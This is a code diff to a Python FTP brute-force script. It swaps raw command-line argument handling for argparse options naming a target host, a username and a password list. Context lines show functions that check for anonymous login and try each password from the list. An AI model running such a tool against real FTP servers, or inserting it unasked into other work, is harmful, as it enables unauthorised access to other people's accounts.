@@ -1,5 +1,6 @@
 import ftplib
 import sys
+import argparse
 
 def anonCheck(host):
     try:
@@ -29,10 +30,15 @@ def bruteForce(host, user, passwordList):
         password = password.strip()
         tryLogin(user, host, password)
 
+parser = argparse.ArgumentParser(description = 'FTP Brute Force')
+parser.add_argument('-t', '--target', help='Hostname or IP', required=True)
+parser.add_argument('-u', '--username', help='FTP Username to brute force', required=True)
+parser.add_argument('-w', '--paswordlist', help='Pasword list Path', default='./passwords.txt')
 
-if len(sys.argv) < 3:
-    print('Not enough arguments, pass hostname, username & directory location')
-    exit()
-else:
-    anonCheck(sys.argv[1])
-    bruteForce(sys.argv[1], sys.argv[2], sys.argv[3])
+args = parser.parse_args()
+
+host = args.target
+username = args.username
+paswordlist = args.paswordlist
+anonCheck(host)
+bruteForce(host, username, paswordlist)
